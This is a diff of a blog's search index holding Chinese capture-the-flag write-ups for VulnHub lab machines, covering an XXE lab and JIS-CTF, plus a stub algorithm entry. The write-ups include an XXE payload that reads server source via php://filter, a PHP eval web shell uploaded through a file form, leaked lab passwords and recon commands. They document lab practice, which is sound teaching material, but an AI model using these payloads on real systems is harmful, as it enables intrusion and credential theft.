@@ -1,6 +1,90 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>求数组连续最大和</title>
+    <url>/uncategorized/%E6%B1%82%E6%95%B0%E7%BB%84%E8%BF%9E%E7%BB%AD%E6%9C%80%E5%A4%A7%E5%92%8C/</url>
+    <content><![CDATA[<p>题目描述：</p>
+<p>一个有n个元素的数组，这个元素的数组既可以是正数又可以是负数，数组中连续的一个元素或多个元素可以组成一个连续的子数组，一个数组可能有很多个子数组，求子数组和的最大值。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>vulnhub_xxe</title>
+    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub-xxe/</url>
+    <content><![CDATA[<h1><span id="vulnhub-xxe实验">vulnhub xxe实验</span></h1><h2><span id="1主机发现">(1)主机发现</span></h2><p>首先ifconfig查看当前ip地址： 10.1.1.92</p>
+<p>然后利用netdiscover被动扫描扫描局域网机器。</p>
+<a id="more"></a>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 10.1.1.92/24</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/assets/image-20200512161540297.png" alt="image-20200512161540297"></p>
+<p>发现两台机器，90，91，93</p>
+<p>利用Nmap扫描端口：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ip.txt #将要扫描的ip列表写进ip.txt</span><br><span class="line">nmap -sV -p 1-65535 -iL ip.txt -v</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="/assets/image-20200512163413524.png" alt="image-20200512163413524"></p>
+<p><img src="/assets/image-20200512163430298.png" alt="image-20200512163430298"></p>
+<p><img src="/assets/image-20200512163449465.png" alt="image-20200512163449465"></p>
+<p>访问91机器，发现是apache目录，找到目标。</p>
+<h2><span id="2网站扫描">（2）网站扫描</span></h2><p>利用kali的dirb扫描:</p>
+<p><img src="/assets/image-20200512162428309.png" alt="image-20200512162428309"></p>
+<p>关键文件：robots.txt</p>
+<p>访问发现：</p>
+<p><img src="/assets/image-20200512162501481.png" alt="image-20200512162501481"></p>
+<p>可以访问xxe目录，发现有登录栏。</p>
+<p>访问admin.php，发现400了。所以猜想可能是xxe下的admin.php</p>
+<p>又发现一个登录页面。所以可以知道后面个登录是管理员登录，前面个登录是用户登录。</p>
+<h3><span id="漏洞挖掘">漏洞挖掘</span></h3><p>访问10.1.1.91/xxe</p>
+<p>输入Name和Password:</p>
+<p><img src="/assets/image-20200512163534468.png" alt="image-20200512163534468"></p>
+<p>抓包:</p>
+<p><img src="/assets/image-20200512163659235.png" alt="image-20200512163659235"></p>
+<p>发现请求是xml请求，猜想有xxe,验证一下。</p>
+<p>构造payload,验证漏洞</p>
+<p><img src="/assets/image-20200512164212079.png" alt="image-20200512164212079"></p>
+<p>漏洞存在。</p>
+<p>构造payload读取源码:</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span>] &gt;</span></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200512164305534.png" alt="image-20200512164305534"></p>
+<p>然后再解码：</p>
+<p><img src="/assets/image-20200512164400006.png" alt="image-20200512164400006"></p>
+<p>成功读取，再读admin.php，并解码：</p>
+<p><img src="/assets/image-20200512164625029.png" alt="image-20200512164625029"></p>
+<p>查出账户名为administhebest。密码的md5为 e6e061838856bf47e1de730719fb2609，md5解密后为admin@123.</p>
+<p>admin.php处输入账号密码：</p>
+<p><img src="/assets/image-20200512164816064.png" alt="image-20200512164816064"></p>
+<p>得到flag:</p>
+<p><img src="/assets/image-20200512164834411.png" alt="image-20200512164834411"></p>
+<p>点击后发现跳转空了，加一个xxe目录就可以。</p>
+<p><img src="/assets/image-20200512164917137.png" alt="image-20200512164917137"></p>
+<p>可能flag在源码里，那就读源码：</p>
+<p><img src="/assets/image-20200512165013929.png" alt="image-20200512165013929"></p>
+<p><img src="/assets/image-20200512165033499.png" alt="image-20200512165033499"></p>
+<p>得到flag：JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5。</p>
+<p>flag还可以再解码： L2V0Yy8uZmxhZy5waHA= </p>
+<p>再base64解码：</p>
+<p>/etc/.flag.php</p>
+<p>再读，由于是在etc目录下，所以用file协议读：</p>
+<p><img src="/assets/image-20200512165748626.png" alt="image-20200512165748626"></p>
+<p>很明显有加密，本地解密得到:</p>
+<p><img src="/assets/image-20200512170140547.png" alt="image-20200512170140547"></p>
+<p>发现不成功，原来是最后的?&gt;标识符打错了。</p>
+<p>重写后发现访问虽然成功了，但是没有结果。重新换一台windows电脑解密即可，flag:</p>
+<p>SAFCSP{xxe_is_so_easy}</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>web</tag>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SkyConCTF2016靶机测试</title>
     <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/SkyConCTF2016%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<p>1、IP探测</p>
@@ -105,87 +189,6 @@
 <p><img src="/assets/image-20180603171745363-1588777753204.png" alt="image-20180603171745363"></p>
 <p>在payload下Payload Processing上添加base64编码方式</p>
 <p><img src="/assets/image-20180603171824459-1588777753204.png" alt="image-20180603171824459"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JIS-CTF靶机测试</title>
-    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h1><span id="jis-ctf-靶机测试">JIS-CTF 靶机测试</span></h1><p>​                                                                                      </p>
-<h2><span id="一-环境搭建">一、环境搭建</span></h2><p>从下面网站下载ova文件并导入到virtual box中。</p>
-<p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p>
-<a id="more"></a>
-
-<h2><span id="二-找flag">二、找flag</span></h2><h3><span id="1ip探测">（1）ip探测</span></h3><p>首先探测靶机的IP地址</p>
-<p>netdiscover -i eth0</p>
-<p>发现mac地址08:00:27:68:18:58对应的ip地址为192.168.1.118</p>
-<h3><span id="2端口扫描">（2）端口扫描</span></h3><p>扫描下端口、服务和操作系统</p>
-<p>nmap -sV -O 192.168.1.118</p>
-<p>结果:</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.2</span>p2 Ubuntu <span class="number">4</span>ubuntu2<span class="number">.1</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span><span class="number">.18</span> ((Ubuntu))</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.8</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br></pre></td></tr></table></figure>
-
-<p>只开了ssh端口和http端口，且是apache服务器，Ubuntu系统</p>
-<p>（3）扫描下常见漏洞：</p>
-<p>nmap –script=vuln 192.168.1.118</p>
-<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Host is up (<span class="number">0.00060</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">| <span class="type">http</span>-csrf:</span><br><span class="line">| <span class="type">Spidering</span> limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span></span><br><span class="line">|   <span class="type">Found</span> the following possible CSRF vulnerabilities:</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Path</span>: http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span>:<span class="number">80</span>/</span><br><span class="line">|     <span class="type">Form</span> id:</span><br><span class="line">|<span class="type">_</span>    Form action: check_login.php</span><br><span class="line">|<span class="type">_http</span>-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| <span class="type">http</span>-enum:</span><br><span class="line">|   <span class="type">/admin_area</span>/: Possible admin folder</span><br><span class="line">|   <span class="type">/login</span>.php: Possible admin folder</span><br><span class="line">|   <span class="type">/admin_area</span>/index.php: Possible admin folder</span><br><span class="line">|   <span class="type">/robots</span>.txt: Robots file</span><br><span class="line">|   <span class="type">/css</span>/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">|<span class="type">_</span>  /js/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">| <span class="type">http</span>-slowloris-check:</span><br><span class="line">|   <span class="type">VULNERABLE</span>:</span><br><span class="line">|   <span class="type">Slowloris</span> DOS attack</span><br><span class="line">|     <span class="type">State</span>: LIKELY VULNERABLE</span><br><span class="line">|     <span class="type">IDs</span>:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       <span class="type">Slowloris</span> tries to keep many connections to the target web server open and hold</span><br><span class="line">|       <span class="type">them</span> open <span class="built_in">as</span> long <span class="built_in">as</span> possible.  It accomplishes this <span class="built_in">by</span> opening connections to</span><br><span class="line">|       <span class="type">the</span> target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       <span class="type">the</span> http server's resources causing Denial Of Service.</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Disclosure</span> date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     <span class="type">References</span>:</span><br><span class="line">|       <span class="type">https</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|<span class="type">_</span>      http://ha.ckers.org/slowloris/</span><br><span class="line">|<span class="type">_http</span>-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|<span class="type">_http</span>-vuln-cve2017<span class="number">-1001000</span>: ERROR: <span class="keyword">Script</span> execution failed (use -d to debug)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
-
-<h3><span id="4找第一个flag">（4）找第一个flag</span></h3><p>有robots敏感目录</p>
-<p>robots.txt文件：</p>
-<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /</span><br><span class="line"><span class="string">Disallow:</span> /backup</span><br><span class="line"><span class="string">Disallow:</span> /admin</span><br><span class="line"><span class="string">Disallow:</span> /admin_area</span><br><span class="line"><span class="string">Disallow:</span> /r00t</span><br><span class="line"><span class="string">Disallow:</span> /uploads</span><br><span class="line"><span class="string">Disallow:</span> /uploaded_files</span><br><span class="line"><span class="string">Disallow:</span> /flag</span><br></pre></td></tr></table></figure>
-
-<p>flag敏感目录很明显，进入拿到第一个flag</p>
-<p>The 1st flag is : {8734509128730458630012095}</p>
-<h3><span id="5找第二个flag">（5）找第二个flag</span></h3><p>再查找其他隐藏目录，一个个的翻，终于在</p>
-<p>admin_area/index.php下找到。</p>
-<p>在第一遍查看时我直接看到这个就跳过了，然后找半天没有办法再一个个仔细看，在这个源代码中发现了第二个flag.</p>
-<p>源代码：</p>
-<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">Fake admin area :)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>The admin area not work :) <span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--	username : admin</span></span></span><br><span class="line"><span class="xml">	password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="xml">	The 2nd flag is : </span><span class="template-variable">&#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>The 2nd flag is : {7412574125871236547895214}</p>
-<p>而且账户名是admin</p>
-<p>密码是3v1l_H@ck3r</p>
-<h3><span id="6找第三个flag">（6）找第三个flag</span></h3><p>在主页面输入账号密码登录进来</p>
-<p><img src="/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98.assets/image-20180601203736905.png" alt="image-20180601203736905"></p>
-<p>看来是个文件上传，试一下。</p>
-<p>上传个php文件一句话木马</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[cmd])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>左上角显示SUCCESS，看来没什么过滤。</p>
-<p>不知道上传到哪了，找一下先前禁止的目录中的/uploaded_files和/uploads</p>
-<p>在/uploaded_files/yijuhua.php发现上传的一句话木马，用菜刀连接试试。不知道为什么连不上。换个大马上传下试试。上传小朋友大马再登录</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.118</span><span class="regexp">/uploaded_files/</span>xiaopengyou.php</span><br></pre></td></tr></table></figure>
-
-<p>成功连接上</p>
-<p>在根目录下发现文件hint.txt.</p>
-<p>里面有第三个flag</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">The <span class="number">3</span>rd flag <span class="keyword">is</span> : &#123;<span class="number">7645110034526579012345670</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>还有提示：</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">try <span class="keyword">to</span> <span class="builtin-name">find</span><span class="built_in"> user </span>technawi password <span class="keyword">to</span> read the flag.txt file, you can <span class="builtin-name">find</span> it <span class="keyword">in</span> a hidden file ;)</span><br></pre></td></tr></table></figure>
-
-<p>而且里面还有flag.txt，发现没有权限。看上面的权限需要找到用户technawi的密码，而且提示在一个隐藏文件中。</p>
-<h3><span id="7找第四个flag">（7）找第四个flag</span></h3><p>下一关应该是相当难的，先在大马中反弹shell到自己端口上，然后利用shell进行操作。我找遍了网站下所有文件都没发现含有technawi密码的隐藏文件，因为它说是hidden file，我理解的是隐藏文件，所以一直在用ls查找。找不到了于是在全局找technawi，找半天也没找到对的，因为太多包含technawi的了。最后机智的想到是不是该找下一个flag了，按以前文件的格式应该是the 4th flag is,于是利用</p>
-<p>grep “the 4th flag”    #注意时间会比价慢</p>
-<p>终于在/etc/mysql/conf.d/credentials.txt文件中找出第四个flag</p>
-<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">The <span class="number">4</span>th flag <span class="keyword">is</span> : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : <span class="type">technawi</span></span><br><span class="line">password : 3<span class="type">vilH</span>@ksor</span><br></pre></td></tr></table></figure>
-
-<p>The 4th flag is : {7845658974123568974185412}   </p>
-<h3><span id="7找第五个flag">（7）找第五个flag</span></h3><p>因为先前查找时已经发现flag.txt属于technawi用户，证明可以用technawi登录ssh，于是</p>
-<p>ssh <a href="mailto:technawi@192.168.1.118">technawi@192.168.1.118</a></p>
-<p>然后vim /var/www/html/flag.txt发现第五个flag</p>
-<p>technawi</p>
-<p>The 5th flag is : {5473215946785213456975249}</p>
-<p>Good job :)</p>
-<p>You find 5 flags and got their points and finish the first scenario….</p>
-<p>到此五个flag全部找出。</p>
-<p>[注]后来去网上寻找才发现直接用</p>
-<p>find / -user technawi 2&gt;/dev/null 寻找更快</p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -683,72 +686,77 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub_xxe</title>
-    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub-xxe/</url>
-    <content><![CDATA[<h1><span id="vulnhub-xxe实验">vulnhub xxe实验</span></h1><h2><span id="1主机发现">(1)主机发现</span></h2><p>首先ifconfig查看当前ip地址： 10.1.1.92</p>
-<p>然后利用netdiscover被动扫描扫描局域网机器。</p>
+    <title>JIS-CTF靶机测试</title>
+    <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h1><span id="jis-ctf-靶机测试">JIS-CTF 靶机测试</span></h1><p>​                                                                                      </p>
+<h2><span id="一-环境搭建">一、环境搭建</span></h2><p>从下面网站下载ova文件并导入到virtual box中。</p>
+<p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p>
 <a id="more"></a>
 
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 10.1.1.92/24</span><br></pre></td></tr></table></figure>
+<h2><span id="二-找flag">二、找flag</span></h2><h3><span id="1ip探测">（1）ip探测</span></h3><p>首先探测靶机的IP地址</p>
+<p>netdiscover -i eth0</p>
+<p>发现mac地址08:00:27:68:18:58对应的ip地址为192.168.1.118</p>
+<h3><span id="2端口扫描">（2）端口扫描</span></h3><p>扫描下端口、服务和操作系统</p>
+<p>nmap -sV -O 192.168.1.118</p>
+<p>结果:</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.2</span>p2 Ubuntu <span class="number">4</span>ubuntu2<span class="number">.1</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span><span class="number">.18</span> ((Ubuntu))</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.8</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br></pre></td></tr></table></figure>
 
+<p>只开了ssh端口和http端口，且是apache服务器，Ubuntu系统</p>
+<p>（3）扫描下常见漏洞：</p>
+<p>nmap –script=vuln 192.168.1.118</p>
+<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Host is up (<span class="number">0.00060</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">| <span class="type">http</span>-csrf:</span><br><span class="line">| <span class="type">Spidering</span> limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span></span><br><span class="line">|   <span class="type">Found</span> the following possible CSRF vulnerabilities:</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Path</span>: http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span>:<span class="number">80</span>/</span><br><span class="line">|     <span class="type">Form</span> id:</span><br><span class="line">|<span class="type">_</span>    Form action: check_login.php</span><br><span class="line">|<span class="type">_http</span>-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| <span class="type">http</span>-enum:</span><br><span class="line">|   <span class="type">/admin_area</span>/: Possible admin folder</span><br><span class="line">|   <span class="type">/login</span>.php: Possible admin folder</span><br><span class="line">|   <span class="type">/admin_area</span>/index.php: Possible admin folder</span><br><span class="line">|   <span class="type">/robots</span>.txt: Robots file</span><br><span class="line">|   <span class="type">/css</span>/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">|<span class="type">_</span>  /js/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">| <span class="type">http</span>-slowloris-check:</span><br><span class="line">|   <span class="type">VULNERABLE</span>:</span><br><span class="line">|   <span class="type">Slowloris</span> DOS attack</span><br><span class="line">|     <span class="type">State</span>: LIKELY VULNERABLE</span><br><span class="line">|     <span class="type">IDs</span>:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       <span class="type">Slowloris</span> tries to keep many connections to the target web server open and hold</span><br><span class="line">|       <span class="type">them</span> open <span class="built_in">as</span> long <span class="built_in">as</span> possible.  It accomplishes this <span class="built_in">by</span> opening connections to</span><br><span class="line">|       <span class="type">the</span> target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       <span class="type">the</span> http server's resources causing Denial Of Service.</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Disclosure</span> date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     <span class="type">References</span>:</span><br><span class="line">|       <span class="type">https</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|<span class="type">_</span>      http://ha.ckers.org/slowloris/</span><br><span class="line">|<span class="type">_http</span>-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|<span class="type">_http</span>-vuln-cve2017<span class="number">-1001000</span>: ERROR: <span class="keyword">Script</span> execution failed (use -d to debug)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
 
+<h3><span id="4找第一个flag">（4）找第一个flag</span></h3><p>有robots敏感目录</p>
+<p>robots.txt文件：</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /</span><br><span class="line"><span class="string">Disallow:</span> /backup</span><br><span class="line"><span class="string">Disallow:</span> /admin</span><br><span class="line"><span class="string">Disallow:</span> /admin_area</span><br><span class="line"><span class="string">Disallow:</span> /r00t</span><br><span class="line"><span class="string">Disallow:</span> /uploads</span><br><span class="line"><span class="string">Disallow:</span> /uploaded_files</span><br><span class="line"><span class="string">Disallow:</span> /flag</span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200512161540297.png" alt="image-20200512161540297"></p>
-<p>发现两台机器，90，91，93</p>
-<p>利用Nmap扫描端口：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ip.txt #将要扫描的ip列表写进ip.txt</span><br><span class="line">nmap -sV -p 1-65535 -iL ip.txt -v</span><br></pre></td></tr></table></figure>
+<p>flag敏感目录很明显，进入拿到第一个flag</p>
+<p>The 1st flag is : {8734509128730458630012095}</p>
+<h3><span id="5找第二个flag">（5）找第二个flag</span></h3><p>再查找其他隐藏目录，一个个的翻，终于在</p>
+<p>admin_area/index.php下找到。</p>
+<p>在第一遍查看时我直接看到这个就跳过了，然后找半天没有办法再一个个仔细看，在这个源代码中发现了第二个flag.</p>
+<p>源代码：</p>
+<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">Fake admin area :)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>The admin area not work :) <span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--	username : admin</span></span></span><br><span class="line"><span class="xml">	password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="xml">	The 2nd flag is : </span><span class="template-variable">&#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<p>结果如下：</p>
-<p><img src="/assets/image-20200512163413524.png" alt="image-20200512163413524"></p>
-<p><img src="/assets/image-20200512163430298.png" alt="image-20200512163430298"></p>
-<p><img src="/assets/image-20200512163449465.png" alt="image-20200512163449465"></p>
-<p>访问91机器，发现是apache目录，找到目标。</p>
-<h2><span id="2网站扫描">（2）网站扫描</span></h2><p>利用kali的dirb扫描:</p>
-<p><img src="/assets/image-20200512162428309.png" alt="image-20200512162428309"></p>
-<p>关键文件：robots.txt</p>
-<p>访问发现：</p>
-<p><img src="/assets/image-20200512162501481.png" alt="image-20200512162501481"></p>
-<p>可以访问xxe目录，发现有登录栏。</p>
-<p>访问admin.php，发现400了。所以猜想可能是xxe下的admin.php</p>
-<p>又发现一个登录页面。所以可以知道后面个登录是管理员登录，前面个登录是用户登录。</p>
-<h3><span id="漏洞挖掘">漏洞挖掘</span></h3><p>访问10.1.1.91/xxe</p>
-<p>输入Name和Password:</p>
-<p><img src="/assets/image-20200512163534468.png" alt="image-20200512163534468"></p>
-<p>抓包:</p>
-<p><img src="/assets/image-20200512163659235.png" alt="image-20200512163659235"></p>
-<p>发现请求是xml请求，猜想有xxe,验证一下。</p>
-<p>构造payload,验证漏洞</p>
-<p><img src="/assets/image-20200512164212079.png" alt="image-20200512164212079"></p>
-<p>漏洞存在。</p>
-<p>构造payload读取源码:</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span>] &gt;</span></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure>
+<p>The 2nd flag is : {7412574125871236547895214}</p>
+<p>而且账户名是admin</p>
+<p>密码是3v1l_H@ck3r</p>
+<h3><span id="6找第三个flag">（6）找第三个flag</span></h3><p>在主页面输入账号密码登录进来</p>
+<p><img src="/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98.assets/image-20180601203736905.png" alt="image-20180601203736905"></p>
+<p>看来是个文件上传，试一下。</p>
+<p>上传个php文件一句话木马</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[cmd])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200512164305534.png" alt="image-20200512164305534"></p>
-<p>然后再解码：</p>
